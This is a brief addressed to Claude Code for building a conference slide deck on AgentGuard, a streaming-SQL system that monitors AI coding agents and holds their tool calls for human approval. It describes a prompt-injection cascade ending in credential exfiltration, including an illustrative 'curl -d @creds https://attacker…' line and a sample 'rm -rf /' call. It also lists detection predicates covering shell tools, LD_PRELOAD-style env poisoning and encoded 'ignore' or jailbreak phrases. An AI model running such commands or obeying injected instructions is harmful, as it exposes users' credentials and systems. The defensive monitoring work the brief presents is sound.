# Slide-deck brief for Claude Code

**Talk:** Machine-Speed Threats Need Machine-Speed Defense: Real-Time Guardrails for AI Agents with Streaming
**Venue:** Data Streaming Summit 2026 ("The Data + Agent Infra Conference"), Hotel Nikko, San Francisco, October 7–8, 2026 — https://datastreaming-summit.org/
**Track:** Agent Harness, Runtime, and Governance (the summit's third track: "the emerging operational layer for AI agents — runtimes, orchestration, observability, and safety mechanisms for production deployment")
**Worked example:** Timeplus AgentGuard, packaged as a Timeplus app — https://github.com/timeplus-io/apps/tree/main/apps/agentguard
**Prior deck to reuse:** https://github.com/timeplus-io/Presentation---AgentGuard-Introduction (React + Vite + Tailwind v4 + motion, 16:9)

This document is the *design input* for Claude Code. It says what the deck must argue, which facts are verified, which slides to build, and which visual system to inherit. Read it fully before writing any slide. When this brief and the existing deck disagree, this brief wins.

---

## 1. How to use this brief

1. **Start from the existing deck repo, not from scratch.** Clone `Presentation---AgentGuard-Introduction`, keep `src/components/Presentation.tsx` (slide state, keyboard nav, `SlideLayout`, `useSlideStep`, `useSlideNav`), `src/index.css` (Timeplus tokens), `src/assets/*`, `package.json`, `vite.config.ts`, and the repo's `CLAUDE.md` design rules. Delete or rewrite the slides in `src/slides/` per §5. Register the new order in `src/App.tsx`.
2. **Treat §5 as the spec.** Each slide entry gives: purpose, the one sentence the audience must leave with, the visual, the verified facts to show, the reveal steps, and speaker-note bullets. Do not add slides that §5 does not list without flagging it.
3. **Only use facts from §6.** Anything marked *illustrative* must be labelled on the slide as illustrative (a small "illustrative SQL" tag) or replaced with the real artifact after verification. Never invent statistics, latencies, or customer claims.
4. **Keep the existing design system** (§7). The conference has no slide template; the deck is Timeplus-branded, conference-neutral.
5. **Deliver** per §8: `npm run lint` clean, every slide screenshotted at 1920×1080, a single-file HTML build, and speaker notes.

---

## 2. The session, verbatim

Keep the abstract text below as the source of truth for claims. The deck must deliver every promise in it.

> AI agents have moved into production faster than security teams have a story for. A coding agent reads your repo, runs shell commands, installs packages, and calls third-party APIs — and a single prompt injection in a scraped webpage can cascade into credential exfiltration before a SOC analyst opens the alert. Traditional tooling wasn't built for this physics: SIEMs operate on multi-minute ingest-and-query loops, telemetry pipelines struggle with stateful multi-step correlation, and WAF/EDR sit at the wrong protocol layer entirely. Agents don't attack your endpoints; they call tools inside their own runtime. Machine-speed threats demand machine-speed defense.
>
> This talk shows how streaming infrastructure closes that gap. Using Timeplus AgentGuard — an open, Timeplus-native application — as a working example, we'll walk through the architecture of a real-time detection and response engine for agent fleets: normalizing hook events and OpenTelemetry traces from heterogeneous runtimes (Claude Code, OpenClaw, Hermes) into a Common Information Model; expressing detection rules as plain streaming SQL materialized views; learning behavioral baselines to flag token-spend spikes and unauthorized tool usage; and correlating multi-step attack chains (probe → injection → exfiltration) with session windows. We'll also dive into the synchronous "hold" mechanism that rides the agent's own PreToolUse hook to pause a dangerous tool call — burning zero tokens — until a human approves or denies.
>
> Attendees will leave with a practical blueprint for policy enforcement, observability, and runtime governance of autonomous agents, built on streaming primitives their team can already read.

**Promises checklist** (each maps to a slide in §5):

| Promise in abstract | Slide(s) |
|---|---|
| Agent capabilities → attack cascade before SOC reacts | 02, 03 |
| SIEM / telemetry / WAF-EDR physics mismatch | 04 |
| "Agents call tools inside their own runtime" | 02, 16 |
| Hook events + OTel from Claude Code, OpenClaw, Hermes | 07 |
| Common Information Model | 08, 09 |
| Rules as plain streaming SQL materialized views | 10, 11 |
| Behavioral baselines: token-spend spikes, unauthorized tool usage | 12 |
| Multi-step chain correlation with session windows | 13 |
| Synchronous hold on PreToolUse, zero tokens, human approve/deny | 16, 17 |
| Blueprint: policy enforcement, observability, runtime governance | 06, 20 |
| "Streaming primitives their team can already read" | 10, 20 |

---

## 3. Audience, tone, and timing

- **Who is in the room:** streaming-platform engineers and agent-infrastructure builders (Pulsar/Kafka/Flink people, agent-runtime people). Security-literate but not a SOC audience. They will respect SQL on a slide and distrust product marketing.
- **Tone:** engineering talk with a thesis. First-person plural ("we built"), concrete numbers, code they can read. Product name appears from slide 06 onward; no feature-list slides until slide 19.
- **The thesis in one line:** *the defense has to live in the same time domain and the same layer as the attack — inside the agent's tool loop, at sub-second latency — and streaming SQL is the primitive that gets you there without a new query language.*
- **Timing assumption:** a 30-minute slot including Q&A is assumed (the summit does not publish slot lengths; confirm with the organizer). Budget 22 content slides at ~60–75 s each, leaving 5 minutes for the demo and 5 for questions. If the slot is 20 minutes, drop slides 11, 14, 19 and merge 16+17.
- **Speaker line on the title slide:** `[SPEAKER NAME], [TITLE], Timeplus` — placeholder until confirmed.

---

## 4. Narrative arc

Four acts. Transitions between acts get a full-bleed "act" slide only if the slide count allows; otherwise the act change is carried by the title style.

1. **The physics problem** (slides 02–05): what an agent does, how fast a cascade runs, why the three traditional tool classes each fail on a different axis (time, state, layer). End on the thesis.
2. **The streaming blueprint** (slides 06–15): one architecture diagram built up layer by layer, then one slide per layer: ingest, normalize, detect, baseline, correlate, dedupe/notify, latency.
3. **Prevention, not just detection** (slides 16–18): the hold mechanism, its timeline, the demo.
4. **Take it home** (slides 19–22): what else the same primitives buy you, the blueprint summary, how to install the app, close.

The recurring visual motif is a **horizontal pipe with animated flow dots** (already implemented as `FlowDot`/`Pipe` in the existing slides). Every architecture slide extends the same pipe left-to-right so the audience sees one system growing, not ten diagrams.

---

## 5. Slide-by-slide specification

Conventions: *Visual* is the dominant element; *Facts* are the only numbers/strings allowed on the slide; *Steps* are click-reveals via `useSlideStep`; *Notes* become speaker notes (see §8).

### 01 — Title
- **Purpose:** name the talk, the speaker, the venue.
- **Visual:** reuse the existing title composition (pulsing shield rings, orbiting `Bot` nodes) but replace the AgentGuard logo with the talk title in two lines: "Machine-Speed Threats Need Machine-Speed Defense" (large) and "Real-Time Guardrails for AI Agents with Streaming" (subtitle). Timeplus logo bottom-left. A small footer pill: "Data Streaming Summit 2026 · San Francisco · Agent Harness, Runtime & Governance track".
- **Facts:** title, speaker placeholder, conference, date Oct 7–8 2026.
- **Notes:** one-sentence hook: "Every tool I'll show you is a stream, a materialized view, or a hook."

### 02 — What an agent actually does
- **Purpose:** establish that the attack surface is the tool loop, not the network edge.
- **One sentence:** Agents don't attack your endpoints; they call tools inside their own runtime.
- **Visual:** a loop diagram: `prompt → model → tool call → result → model …` with four tool cards orbiting: *reads your repo*, *runs shell commands*, *installs packages*, *calls third-party APIs* (the four verbs from the abstract). Each card shows the real Claude Code hook name that fires around it (`PreToolUse` / `PostToolUse`).
- **Facts:** the four verbs; hook names `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `SessionStart`, `SessionEnd` (Claude Code hook vocabulary; AgentGuard normalizes them, see slide 08).
- **Steps:** 1) the loop; 2) the four tool cards; 3) a red callout on the loop: "no packet crosses a perimeter here".
- **Notes:** WAF/EDR see a process making HTTPS calls to an LLM; the dangerous decision happened in text.

### 03 — The cascade, in seconds
- **Purpose:** make the speed concrete.
- **One sentence:** A single prompt injection in a scraped webpage cascades into credential exfiltration before a SOC analyst opens the alert.
- **Visual:** a horizontal timeline with four beats: `t+0s  WebFetch returns page with hidden instructions` → `t+2s  model "decides" to read ~/.aws/credentials` → `t+4s  Bash: curl -d @creds https://attacker…` → `t+5s  done`. Below it, a second, much longer bar labelled "SIEM ingest + query + triage: minutes" for scale.
- **Facts:** the timeline is **illustrative** (label it); the attack pattern itself is documented — link the existing deck's sources: Rehberger "Month of AI Bugs" (Aug 2025), Pillar Security invisible-Unicode backdoor, OWASP Top 10 for Agentic Applications (Dec 2025). URLs are in §6.
- **Steps:** beats appear one by one; the SIEM bar last.
- **Notes:** emphasise each step is a *legitimate* tool call in isolation; only the chain is malicious (sets up slide 13).

### 04 — Why the usual tools miss it
- **Purpose:** the three failure axes, one per tool class.
- **One sentence:** Traditional tooling wasn't built for this physics.
- **Visual:** a 3-column comparison (reuse the "Why Existing Tools Fall Short" card layout): **SIEM** — "multi-minute ingest-and-query loop" (axis: *time*); **Telemetry pipelines** — "stateless; multi-step correlation is an afterthought" (axis: *state*); **WAF / EDR** — "wrong protocol layer; sees HTTPS to an LLM, not a tool decision" (axis: *layer*). Bottom banner (step 4): "Machine-speed threats demand machine-speed defense."
- **Facts:** no vendor names; keep claims qualitative.
- **Steps:** three columns then the banner.

### 05 — Thesis
- **Purpose:** state the answer before the architecture.
- **Visual:** near-empty slide, large type: "Put the defense in the same time domain and the same layer as the attack." Under it three small pills: *sub-second* · *stateful* · *inside the tool loop*. Beneath, a single line: "…using streaming primitives your team can already read: streams, materialized views, windows, SQL."
- **Notes:** this is the sentence to repeat at the close.

### 06 — The blueprint (architecture overview)
- **Purpose:** the one diagram the rest of the talk zooms into.
- **Visual:** left-to-right pipe, built in steps: `Agents (Claude Code · OpenClaw · Hermes · any OTLP emitter)` → `Raw streams: agentguard_hook_events, otel_traces/logs/metrics_*` → `CIM normalizer MVs (mv_cim_*)` → `agentguard_cim_event` → `Rule MVs (mv_rule_*)` → `agentguard_security_events` → `mv_threats → agentguard_threats (mutable, upsert)` → `UI / SSE / hold decision`. Mark the layers with the five labels from the app README: Raw OTel, Raw hooks, CIM, Metrics, Security (+ Derived).
- **Facts:** all stream/MV names are real and come from the app manifest (§6). Database name `ag`. OTLP/HTTP input on port `4318` (configurable `otel_port`).
- **Steps:** 1) agents + raw streams; 2) CIM; 3) rules + security events; 4) threats + response.
- **Notes:** "Everything to the right of the agents is SQL in one Timeplus database. There is no custom detection engine."

### 07 — Two paths in: hooks and OTel
- **Purpose:** show ingest is boring on purpose.
- **Visual:** two side-by-side panels (reuse "Data Collection: Two Paths In"). Left **Hook events** (primary): plugin per runtime — `@timeplus/agentguard-claudecode-plugin` (npm), `@timeplus/agentguard-openclaw-plugin` (npm), `agentguard-hermes-plugin` (PyPI) — writing rows into `agentguard_hook_events`. Right **OTel** (secondary): `OTEL_EXPORTER_OTLP_ENDPOINT=http://<timeplus>:4318`, `CLAUDE_CODE_ENABLE_TELEMETRY=1`, landing in `otel_traces`, `otel_logs`, `otel_metrics_gauge/sum/histogram/exponential_histogram/summary`.
- **Facts:** hooks capture the *decision lifecycle* (what was asked, which tool, what it returned, whether governance blocked it); OTel captures the *operational profile* (tokens, latency, cache ratios). Claude Code token and latency data comes only from OTel logs. Hermes has hooks but no OTel path.
- **Steps:** left panel, right panel.
- **Notes:** the hook path is what makes prevention possible (slide 16); OTel alone can never block.

### 08 — Three runtimes, three vocabularies
- **Purpose:** motivate the CIM.
- **Visual:** a mismatch table (reuse the "Vocabulary Mismatch" component) with a third column added for Hermes. Rows: *user message*, *tool call*, *tool result*, *token field*, *LLM latency*. Values for Claude Code and OpenClaw come from the existing deck's `mismatchRows` (e.g. `user_prompt_submit` vs `message_received`; `log_attributes['input_tokens']` vs `event_data…usage.input`). Fill the Hermes column from `mv_cim_hermes.sql` in the app package (**verify before use**).
- **Facts:** the footer line from the existing deck: "Without CIM: per-agent rule logic. Every new agent breaks all rules."
- **Notes:** this is the "heterogeneous runtimes" promise in the abstract.

### 09 — Common Information Model
- **Purpose:** one schema, rules written once.
- **Visual:** left, the `agentguard_cim_event` schema as a compact column list (20 columns, from §6); right, a code panel showing the heart of `mv_cim_claudecode`: the `multi_if(hook_name = 'user_prompt_submit', 'user_input', hook_name = 'before_tool_call', 'tool_invoke', …)` mapping plus `json_value(event_data, '$.prompt') AS user_message`. Pills row: the seven canonical event types `session_start, session_end, user_input, llm_request, llm_response, tool_invoke, tool_complete`.
- **Facts:** schema and SQL are verbatim from the app package; four normalizer MVs exist (`mv_cim_claudecode`, `mv_cim_openclaw`, `mv_cim_hermes`, `mv_cim_openinference`) plus a hook→OpenInference bridge.
- **Steps:** schema; mapping SQL; event-type pills.
- **Notes:** "A normalizer is a materialized view with a `multi_if`. Adding a runtime is adding one MV."

### 10 — A detection rule is a materialized view
- **Purpose:** the central engineering claim of the talk.
- **One sentence:** Security rules are plain streaming SQL materialized views — agent-agnostic, always-on.
- **Visual:** top: pipe `agentguard_cim_event → mv_rule_<id> → agentguard_security_events` (reuse). Bottom: the four Core Protection rules as cards with a "SQL" button each (reuse the `StreamingDetectionSlide` interaction): `rp-001 Prompt Injection Shield (critical)`, `rp-002 DLP Sentinel (critical)`, `rp-003 Privilege Guard (warning)`, `rp-004 Supply Chain Watch (warning)`. Clicking shows a trimmed version of the real MV SQL.
- **Facts:** the skeleton every rule shares:
  ```sql
  CREATE MATERIALIZED VIEW ag.mv_rule_rp003
  INTO ag.agentguard_security_events AS
  SELECT event_time AS detected_at, 'rp-003' AS rule_id, 'warning' AS severity,
         agent_id, session_id, run_id, tool_name, concat(...) AS message
  FROM ag.agentguard_cim_event
  WHERE event_type = 'tool_invoke' AND ( ...predicates... )
  ```
  The four rules run from the moment the app is installed; pause/resume with `SYSTEM PAUSE|RESUME MATERIALIZED VIEW ag.mv_rule_rp002`.
- **Steps:** pipe; rule cards.
- **Notes:** "No DSL, no sidecar, no rule engine to learn. If you can write a WHERE clause you can write a detection."

### 11 — Anatomy of one rule (Privilege Guard)
- **Purpose:** show rules are real, evolving, and sometimes clever.
- **Visual:** the `rp-003` WHERE clause with four annotated predicate groups: dangerous tool names (`bash, shell, exec, run_terminal_cmd, computer`); shell metacharacter injection (backticks, `$(…)`); env-var poisoning (`export PAGER|BROWSER|PERL5OPT|NODE_OPTIONS|LD_PRELOAD…=`, from CVE-2026-22708); and the compound-command evasion trick `((length(tool_input) - length(replace_all(tool_input, '&&', ''))) / 2) >= 15` with a margin note "RE2 has no `{N,}` open quantifier, so count by length difference". Top-right: a changelog pill "v1.1.0 → v1.2.0, Apr 2026".
- **Facts:** all from `ddl/048_mv_rule_rp003.sql` in the app package (quote exactly).
- **Notes:** rules carry a changelog like code; new CVEs become new predicates, shipped as a new MV version.

### 12 — Behavioral baselines: spend spikes and unauthorized tools
- **Purpose:** deliver the "learning behavioral baselines" promise.
- **Visual:** left, a live-style line chart (recharts) of tokens per minute for one agent with a shaded baseline band and a spike breaking out; right, the SQL that produces the alert. Second mini-panel: "unauthorized tool usage" as a set-difference against a per-agent allowlist / first-seen tool.
- **Facts (illustrative — label it):** per-agent rolling baseline over `agentguard_cim_metrics` with a `hop()`/`tumble()` window and a threshold against a trailing mean + k·stddev; first-seen tool via a mutable-stream lookup keyed `(agent_id, tool_name)`. Keep the SQL ≤ 14 lines. Before the talk, replace with the real rule from the AgentGuard catalog pack `resource-abuse.yaml` (and `privilege-escalation.yaml` for unauthorized tools) if one exists; otherwise keep the illustrative tag.
- **Steps:** chart; SQL; second panel.
- **Notes:** baselines are just another MV reading the metrics stream; the "learning" is a windowed aggregate, not a model.

### 13 — Correlating the chain: probe → injection → exfiltration
- **Purpose:** deliver the "multi-step attack chains with session windows" promise and answer slide 03.
- **Visual:** three swim lanes keyed by `session_id` showing three independently benign events — `tool_complete` (WebFetch of an external page), `user_input`/`llm_request` matching an injection pattern (`rp-001`), `tool_invoke` with credential path + outbound `curl` — converging into one chain alert. Right: the SQL shape, grouped by `session_id` within a session window (`session(…)` or a bounded `hop()`), using `group_array(event_type)`/`min_if`/`max_if` ordering to assert the sequence.
- **Facts (illustrative — label it):** same verification rule as slide 12; check `data-exfiltration.yaml` and `lateral-movement.yaml` in the catalog for a shipped chain rule. The dedupe key downstream is real: `agentguard_threats` upserts on `(agent_id, session_id, rule_id)`.
- **Steps:** lanes; convergence; SQL.
- **Notes:** this is the slide that answers "telemetry pipelines struggle with stateful multi-step correlation": state lives in the window, not in an analyst's head.

### 14 — From match to threat: dedup, lifecycle, notify
- **Purpose:** show the stateful tail of the pipeline.
- **Visual:** vertical pipe (reuse `AlertPipelineSlide`): `mv_rule_<id>` → `agentguard_security_events` → `mv_threats` → `agentguard_threats` (mutable stream, upsert keyed `(agent_id, session_id, rule_id)`) → notify watcher tailing a streaming query → SSE to the browser. Right: the threat lifecycle `OPEN → ACK → CLEARED (re-opens if it fires again)`.
- **Facts:** `mv_threats` SQL is real (`SETTINGS seek_to = 'earliest'`); the backend tails `agentguard_notify_events` via a streaming SQL query, no Timeplus→backend callback; seen-state persisted in `agentguard_notifications`.
- **Notes:** mutable streams are how you get "a row per open threat" without a second database.

### 15 — Latency budget
- **Purpose:** quantify "machine-speed".
- **Visual:** a horizontal ruler from `t+0` to `t+600 ms`: `t+5 ms plugin sees PreToolUse` · `t+10 ms POST /api/holds` · `t+50 ms MVs consume the event` · `t+100–600 ms poll agentguard_security_events every 50 ms (holds.mv_wait_ms = 500)` · `t+600 ms decide`. Big number: **sub-second** end to end. Side stat: no-rule overhead ~70–110 ms.
- **Facts:** from `docs/holds.md` in the AgentGuard repo and the existing Holds slide. The sub-second claim is a design budget, not a benchmark; say so in notes.

### 16 — The hold: prevention on the agent's own hook
- **Purpose:** the signature mechanism.
- **One sentence:** A synchronous gate on PreToolUse pauses the tool call — burning zero tokens — until a rule or a human decides.
- **Visual:** reuse the Holds slide composition: `Agent: PreToolUse fires (rm -rf /)` → `POST /api/holds` → `AgentGuard gate: ingest → evaluate → decide` → three outcome cards `allow (log_only)`, `block (auto_block)`, `hold (require approval)` → human-in-the-loop card with Approve / Deny → return path "decision returns on the open connection; plugin writes allow/deny to the agent". Right column: **Opt-in** (`AGENTGUARD_HOLDS_ENABLED`), **Fail-safe** (`AGENTGUARD_HOLDS_FAIL_POLICY` deny/allow; crash → pending holds marked `abandoned`), **Zero tokens** (the model is blocked on the hook; no completion is in flight).
- **Facts:** per-rule `block_policy` ∈ {`log_only`, `auto_block`, `hold`}; agent resumes within ~1 s of a click; hold waits up to 540 s, clamped under Claude Code's 600 s hook cap (default `holds.timeout_seconds = 300`); all three plugins implement it in `PreToolUse` / `pre_tool_call` / `before_tool_call`. **Scope note for the slide footer:** holds need the AgentGuard server alongside the Timeplus app (the app package ships streams, MVs and dashboard only).
- **Steps:** request lane; decision fan-out; human card; guarantees.
- **Notes:** "The same hook the runtime gives you for linting is the enforcement point. We didn't add a proxy; we answered a question the agent was already asking."

### 17 — Hold timeline (sequence)
- **Purpose:** make slide 16 concrete for engineers.
- **Visual:** a four-actor sequence diagram (Plugin · Backend · Timeplus · Human) with the timestamps from `docs/holds.md`: `t+5 ms` hook detected → `t+10 ms` POST with 540 s AbortController → `t+50 ms` MVs consume → `t+100–600 ms` MV poll → `t+605 ms` `hold_id` created, long-poll begins → human click → `~1 s` later the agent proceeds or is denied. Footer: failure table in three rows: *MV window expires with no match → allow*; *no human in time → `status='timeout'`, server fail policy*; *backend crash → `abandoned`, plugin fail policy*.
- **Notes:** point out "no false positives from timeouts": a silent window means allow.

### 18 — Demo
- **Purpose:** show it live or recorded.
- **Visual:** embed `src/assets/AgentGuardDemo.mp4` (or `demo.gif` fallback) full-bleed with a thin title bar; add a "Live demo" switch slide variant that is just a dark placeholder with the three steps to perform: 1) run a Claude Code session with the plugin, 2) paste the injection page, 3) watch the hold appear and deny it.
- **Notes:** rehearse the recorded fallback; the venue network is not under our control.

### 19 — Same primitives, more guardrails
- **Purpose:** breadth in one slide, no feature list.
- **Visual:** four compact cards each tagged with the primitive it is built on: **Memory monitoring** (`agentguard_memory_ops` + `mv_memory_*`; threats: poisoning, exfiltration via recall, accumulation) → *stream + MV*; **Skills monitoring** (`agentguard_skills`, loaded vs invoked, workspace-planted skills) → *stream + MV*; **Semantic DLP** (PII/entity extraction, embeddings and risk classification pre-computed at ingest by Python UDFs; the large model only reasons over ~20 candidates) → *UDF at ingest*; **Sentry** (read-only ReAct analyst over the same streams) → *SQL as the tool surface*. Small footer: "10 rule packs in the catalog: core, prompt-injection, credential-theft, data-exfiltration, data-security-audit, lateral-movement, privilege-escalation, resource-abuse, sensitive-data, supply-chain."
- **Facts:** all from the AgentGuard README and repo tree (§6). Memory/skills/DLP/Sentry need the server; say "beyond the core app" in the subtitle.

### 20 — The blueprint, as a table
- **Purpose:** the takeaway the abstract promises.
- **Visual:** a 3×2 matrix. Rows: **Observability**, **Policy enforcement**, **Runtime governance**. Columns: *what you need* → *the streaming primitive that gives it to you*. Cells: Observability → append-only streams + CIM MV (`agentguard_cim_event`), OTel metrics MVs; Policy enforcement → rule MVs `INTO security_events`, per-rule `block_policy`, PreToolUse hold; Runtime governance → mutable streams for threat/hold state, session windows for chains, budgets (`agentguard_cost_budgets`) and pricing (`agentguard_pricing`) streams.
- **Notes:** "Nothing on this slide requires a new language. It is streams, materialized views, windows, mutable streams, UDFs and one hook."

### 21 — Install it in one command
- **Purpose:** make it reproducible tonight.
- **Visual:** left, a terminal block:
  ```bash
  git clone https://github.com/timeplus-io/apps
  cd apps/apps/agentguard
  make build && make install   # NEUTRON_URL=http://localhost:8000 TENANT=default
  ```
  with the note "49 resources into database `ag`: 15 streams, 4 mutable streams, 1 OTLP input, 28 materialized views, 1 UDF, plus 1 dashboard". Right: link cards — app package (apps repo), AgentGuard product page `timeplus.com/agentguard`, docs `docs.timeplus.com/agentguard-introduction`, install guide `docs.timeplus.com/agentguard-installation`, Proton (open-source engine) `github.com/timeplus-io/proton`, Slack `timeplus.com/slack`. QR code for the apps repo (generate a static SVG; no external image).
- **Facts:** counts come from the manifest (§6, verify after regenerating the package). Config keys `otel_port` (4318) and `otel_listen_host`.

### 22 — Close
- **Visual:** the thesis sentence from slide 05 again, Timeplus logo, speaker contact placeholder, "Questions?".
- **Notes:** end on the thesis, not on a thank-you.

---

## 6. Fact sheet (verified vs. to-verify)

Everything below was read from the sources on 2026-10-05. Columns: **V** = verified in source, **I** = illustrative / must be labelled or replaced.

### Conference
| Fact | V/I | Source |
|---|---|---|
| Data Streaming Summit 2026, Oct 7–8, Hotel Nikko, 222 Mason St, San Francisco | V | datastreaming-summit.org/dss2026; Eventbrite listing |
| Organizer StreamNative; tagline "The Data + Agent Conference" | V | datastreaming-summit.org |
| Three tracks: Data Streaming Engines · Data Streaming for Agents · Agent Harness, Runtime, and Governance | V | sessionize.com/data-streaming-summit-san-francisco-2026 |
| Timeplus is a Community sponsor | V | datastreaming-summit.org/dss2026 |
| Session length | **unknown** — assume 30 min, confirm | — |
| Speaker slide template | none published | — |

### The Timeplus app package (`apps/agentguard`, manifest v0.1.1)
| Fact | V/I |
|---|---|
| Package id `io.timeplus.agentguard`, database `ag`, categories security + observability | V |
| Generated from the AgentGuard backend (`make tpapp`); SQL not hand-edited | V |
| Config: `otel_port` default 4318, `otel_listen_host` default 0.0.0.0 | V |
| Resources: 49 entries — streams `otel_traces`, `otel_logs`, `otel_metrics_{gauge,sum,histogram,exponential_histogram,summary}`, `agentguard_hook_events`, `agentguard_cim_event`, `agentguard_cim_metrics`, `agentguard_security_events`, `agentguard_cost_budgets`, `agentguard_skills`, `agentguard_memory_ops`, `agentguard_rules`; mutable streams `agentguard_session_agents`, `agentguard_run_latency`, `agentguard_threats`, `agentguard_pricing`; input `agentguard_otel_input`; UDF `ag_dlp_jwt_check`; 28 MVs (`mv_cim_*` ×4, `mv_hook_bridge_openinference`, `mv_session_agents`, `mv_run_latency`, `mv_cim_metrics_*` ×7, `mv_threats`, `mv_skills_*` ×5, `mv_memory_*` ×4, `mv_rule_rp001..rp004`); 15 streams in total | V (recount after any regeneration) |
| Dashboard "AgentGuard Overview": events/min by agent type, tokens by model, open threats by severity, recent threats | V |
| Four Core Protection rules run from install; pause with `SYSTEM PAUSE MATERIALIZED VIEW ag.mv_rule_rp002` | V |
| Not in the package (needs the AgentGuard server): user management, notifications, approval holds, Sentry, Semantic DLP, rest of the rule catalog | V |
| `agentguard_cim_event` columns: event_time, event_type, agent_type, agent_id, deployment_id, session_id, run_id, provider, model, tool_name, tool_input, tool_result, tool_success, tool_duration_ms, user_message, assistant_message, hook_decision, block_reason, raw_hook_name, raw_event_data | V |
| `mv_cim_claudecode` maps hook names via `multi_if` (`user_prompt_submit→user_input`, `before_tool_call→tool_invoke`, `after_tool_call→tool_complete`, `llm_output→llm_response`, `subagent_spawning→session_start`) and infers provider (vertex / bedrock / anthropic) from the model string | V |
| `mv_threats`: `SELECT agent_id, deployment_id, session_id, rule_id, rule_name, severity, detected_at AS last_seen FROM agentguard_security_events SETTINGS seek_to='earliest'` into mutable `agentguard_threats` | V |
| `rp-003` predicates incl. CVE-2026-22708 env-var poisoning and the `&&`-count evasion check; changelog v1.1.0 (2026-04-16) and v1.2.0 (2026-04-17) | V |
| `rp-001` predicates incl. base64 `aWdub3Jl`, zero-width-space obfuscation, sockpuppeting prefill, "jailbreak yourself" family | V |

### AgentGuard server (private repo `timeplus-io/AgentGuard`; README + `docs/holds.md`)
| Fact | V/I |
|---|---|
| Runtimes: OpenClaw, Claude Code, Hermes Agent; plugins on npm (`@timeplus/agentguard-claudecode-plugin`, `@timeplus/agentguard-openclaw-plugin`) and PyPI (`agentguard-hermes-plugin`) | V |
| Block policy per rule: `log_only` (default), `auto_block`, `hold`; agent resumes within ~1 s of Approve/Deny; "No LLM tokens are burned while waiting" | V |
| `holds.mv_wait_ms` default 500 (poll `agentguard_security_events` every 50 ms); `holds.timeout_seconds` default 300, clamped to 540 s under Claude Code's 600 s hook cap; `holds.fail_policy` default `deny`; plugin-side `AGENTGUARD_HOLDS_FAIL_POLICY`, `AGENTGUARD_HOLDS_ENABLED` | V |
| Failure matrix: MV window expires with no match → allow; human timeout → `status='timeout'` + server fail policy; crash → `abandoned`; session end → `_abandon-session` | V |
| Timeline t+5 ms … t+605 ms as in slide 17 | V (design doc values, not a benchmark) |
| Existing deck's "~70–110 ms when no rule fires" | V (deck claim; treat as design budget) |
| Notify: backend tails `agentguard_notify_events` with a streaming query; SSE at `/api/notifications/stream`; seen-state in `agentguard_notifications` | V |
| Semantic DLP: enrichment by Timeplus Python UDFs calling an OpenAI-compatible endpoint; large model reasons over ~20 candidates | V |
| Sentry: read-only ReAct analyst over Timeplus; Phase 1 chat core | V |
| Rule catalog packs (10): core, credential-theft, data-exfiltration, data-security-audit, lateral-movement, privilege-escalation, prompt-injection, resource-abuse, sensitive-data, supply-chain | V (file names only; contents not read) |
| Memory monitoring sources: Claude Code auto-memory (`~/.claude/projects/<repo>/memory/*.md`), MCP (`mcp__<server>__<tool>`), OpenClaw file (`.openclaw/workspace/memory/`); ops save/search/read/update/delete | V (existing deck) |
| Behavioral baseline SQL (token spike, first-seen tool) | **I** — write illustrative SQL, then look for a shipped rule in `resource-abuse.yaml` / `privilege-escalation.yaml` |
| Attack-chain session-window SQL | **I** — same; check `data-exfiltration.yaml` / `lateral-movement.yaml` |
| Slide 03 cascade timings | **I** |

### External citations (reuse from the existing deck; keep the links on-slide as small source pills)
- Gartner, Aug 2025: 40% of enterprise apps will embed task-specific agents by end-2026, up from <5% in 2025 — https://www.gartner.com/en/newsroom/press-releases/2025-08-26-gartner-predicts-40-percent-of-enterprise-apps-will-feature-task-specific-ai-agents-by-2026-up-from-less-than-5-percent-in-2025
- Rehberger, "Month of AI Bugs", Aug 2025 — https://embracethered.com/blog/posts/2025/announcement-the-month-of-ai-bugs/
- Pillar Security, invisible-Unicode backdoors in coding agents — https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents
- OWASP Top 10 for Agentic Applications 2026 — https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
- Cybersecurity Insiders AI Risk & Readiness 2026 (73% deployed / 7% real-time governance) — https://www.cybersecurity-insiders.com/ai-risk-and-readiness-report-2026/
- NeuralTrust CISO survey (73% concerned / 30% mature safeguards) — https://www.prnewswire.com/news-releases/the-state-of-ai-agent-security-73-of-cisos-fear-ai-agent-risks-but-only-30-are-ready-302607386.html
- Akto, State of Agentic AI Security 2025 (79% blind spots) — https://www.akto.io/blog/state-of-agentic-ai-security-2025

Use at most one stats slide; the abstract does not promise market numbers, so these are optional for slide 02/04 context only.

---

## 7. Design system (inherit, do not reinvent)

- **Stack:** React 19 + Vite 6 + Tailwind v4 (`@tailwindcss/vite`, no config file) + `motion/react` + `lucide-react` + `recharts` + `prism-react-renderer` (SQL highlighting, `themes.github`). `vite-plugin-singlefile` is already a devDependency for the single-file build.
- **Canvas:** 16:9, `Presentation.tsx` constrains to viewport; slides are `absolute inset-0 p-8 md:p-12 flex flex-col`. Design at 1920×1080; verify at 1280×720.
- **Tokens (from `src/index.css`):** gray scale `--color-gray-100 #120F1A` (darkest) … `--color-gray-900 #F7F6F6` (page bg); brand `--color-pink-500 #D53F8C`, `--color-pink-400 #B83280`; alert `--color-red-500 #D12D50`, `--color-red-400 #751025`; font Inter. Note the scale is inverted relative to Tailwind defaults: `text-gray-100` is near-black.
- **Semantic color use:** pink = Timeplus / the pipeline; red = threats and `critical`; amber = `warning` and holds; violet = rule MVs; sky = Claude Code; orange = OpenClaw; pick one unused hue (teal/emerald) for Hermes and keep it consistent; green = allow/cleared.
- **Components to reuse:** `SlideLayout` (title + subtitle header), `useSlideStep` for click-reveals, `FlowDot` + `Pipe` (horizontal) and `VerticalPipe` for animated data flow, the badge-card (`BadgeCard`), the stats card with blurred pink glow, the mismatch table, the rule card + SQL viewer.
- **Text rules (from the repo's CLAUDE.md):** minimize text, maximize visuals; big number + label over sentences; flow diagram over bullet lists; one concept per visual unit; if more than one short sentence per concept, find a visual. Additional rules for this deck: titles ≤ 8 words; subtitles ≤ 16 words; code panels ≤ 14 lines at ≥ 18 px; never more than one code panel per slide; every number on a slide must appear in §6.
- **Motion:** entrance only (`opacity`/`y` 10–20 px, 0.3–0.4 s, staggered 0.06–0.12 s); looping motion only on pipes and the title rings; no transitions that exceed 0.5 s; every step-reveal must also render fully when the slide is reached via `goToSlide`.
- **Branding:** Timeplus logo (`timeplus-circles_for-light-bg.svg`, `timeplus-logo-black_for-light-bg.svg`) on title, blueprint and close slides only. AgentGuard logo (`timeplus-agentguard_logo-pink.svg`) first appears on slide 06. No StreamNative or conference logos (none are licensed to us); the conference is named in text only.
